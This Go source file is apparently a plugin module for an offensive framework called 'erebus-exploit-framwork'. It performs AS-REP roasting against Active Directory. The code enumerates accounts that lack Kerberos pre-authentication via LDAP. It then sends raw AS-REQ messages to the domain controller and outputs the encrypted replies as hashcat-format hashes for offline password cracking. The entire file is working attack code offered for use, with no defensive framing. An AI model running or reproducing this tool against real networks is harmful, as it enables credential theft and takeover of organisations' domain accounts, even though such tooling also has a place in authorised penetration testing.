package ad

import (
	"context"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"io"
	"net"
	"strings"
	"time"

	ldaplib "github.com/go-ldap/ldap/v3"
	"github.com/jcmturner/gokrb5/v8/client"
	"github.com/jcmturner/gokrb5/v8/config"
	"github.com/jcmturner/gokrb5/v8/messages"
	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
	"github.com/KKingZero/erebus-exploit-framwork/pkg/plugin"
	"google.golang.org/protobuf/proto"
)

func init() {
	plugin.Global.Register(&ASREPRoastModule{})
}

type ASREPRoastModule struct{}

func (m *ASREPRoastModule) Name() string        { return "asreproast" }
func (m *ASREPRoastModule) Description() string { return "AS-REP Roasting - extract AS-REP hashes for accounts without pre-auth" }

func (m *ASREPRoastModule) Execute(ctx context.Context, cfgData []byte) ([]byte, error) {
	cfg := &pb.ASREPRoastConfig{}
	if err := proto.Unmarshal(cfgData, cfg); err != nil {
		return nil, fmt.Errorf("unmarshal asreproast config: %w", err)
	}

	result, err := runASREPRoast(ctx, cfg)
	if err != nil {
		return nil, err
	}

	return proto.Marshal(result)
}

func runASREPRoast(_ context.Context, cfg *pb.ASREPRoastConfig) (*pb.ASREPRoastResult, error) {
	if cfg.Domain == "" {
		return nil, fmt.Errorf("domain required")
	}

	dc := cfg.TargetDc
	if dc == "" {
		return nil, fmt.Errorf("target_dc required")
	}

	users := cfg.TargetUsers

	// If no users provided, enumerate via LDAP
	if len(users) == 0 {
		ldapAddr := dc
		if !strings.Contains(ldapAddr, ":") {
			ldapAddr = ldapAddr + ":389"
		}
		conn, err := ldaplib.Dial("tcp", ldapAddr)
		if err != nil {
			return nil, fmt.Errorf("LDAP connect: %w", err)
		}
		defer conn.Close()

		baseDN := domainToBaseDN(cfg.Domain)
		enumUsers, err := EnumASREPRoastable(conn, baseDN)
		if err != nil {
			return nil, fmt.Errorf("enumerate ASREP-roastable: %w", err)
		}
		users = enumUsers
	}

	if len(users) == 0 {
		return &pb.ASREPRoastResult{}, nil
	}

	krbConf := buildKrbConfig(cfg.Domain, dc)
	var hashes []*pb.ASREPHash

	for _, username := range users {
		// Create a client with an empty password to trigger AS-REP without pre-auth
		cl := client.NewWithPassword(username, cfg.Domain, "", krbConf,
			client.DisablePAFXFAST(true))

		// Try to login - this will fail but we can capture the AS-REP
		// For accounts with DONT_REQ_PREAUTH, the KDC returns an AS-REP
		// with an encrypted part we can crack offline
		err := cl.Login()
		if err != nil {
			// Try raw AS-REQ approach
			hash, hashErr := rawASREPRoast(dc, username, cfg.Domain, krbConf)
			if hashErr != nil {
				continue
			}
			hashes = append(hashes, &pb.ASREPHash{
				Username: username,
				Hash:     hash,
			})
			continue
		}
		cl.Destroy()
	}

	return &pb.ASREPRoastResult{Hashes: hashes}, nil
}

func rawASREPRoast(dc, username, domain string, krbConf *config.Config) (string, error) {
	// Build a raw AS-REQ without pre-authentication data
	cl := client.NewWithPassword(username, domain, "", krbConf,
		client.DisablePAFXFAST(true))

	cname := cl.Credentials.CName()
	realm := strings.ToUpper(domain)
	asReq, err := messages.NewASReqForTGT(realm, krbConf, cname)
	if err != nil {
		return "", fmt.Errorf("build AS-REQ: %w", err)
	}

	// Remove any PA-DATA (pre-authentication data) to request without pre-auth
	asReq.PAData = nil

	b, err := asReq.Marshal()
	if err != nil {
		return "", fmt.Errorf("marshal AS-REQ: %w", err)
	}

	resp, err := sendKDCRequest(dc, b)
	if err != nil {
		return "", fmt.Errorf("send KDC request: %w", err)
	}

	// Try to parse as AS-REP
	asRep := &messages.ASRep{}
	err = asRep.Unmarshal(resp)
	if err != nil {
		return "", fmt.Errorf("parse AS-REP: %w", err)
	}

	cipher := hex.EncodeToString(asRep.EncPart.Cipher)

	// Format as hashcat mode 18200
	return fmt.Sprintf("$krb5asrep$23$%s@%s:%s", username, realm, cipher), nil
}

func sendKDCRequest(dc string, data []byte) ([]byte, error) {
	addr := dc + ":88"
	conn, err := net.DialTimeout("tcp", addr, 10*time.Second)
	if err != nil {
		return nil, err
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(10 * time.Second))

	// TCP Kerberos: 4-byte length prefix
	length := make([]byte, 4)
	binary.BigEndian.PutUint32(length, uint32(len(data)))
	conn.Write(length)
	conn.Write(data)

	// Read response length
	if _, err := io.ReadFull(conn, length); err != nil {
		return nil, err
	}
	respLen := binary.BigEndian.Uint32(length)
	if respLen > 1<<20 {
		return nil, fmt.Errorf("response too large: %d", respLen)
	}

	resp := make([]byte, respLen)
	if _, err := io.ReadFull(conn, resp); err != nil {
		return nil, err
	}
	return resp, nil
}
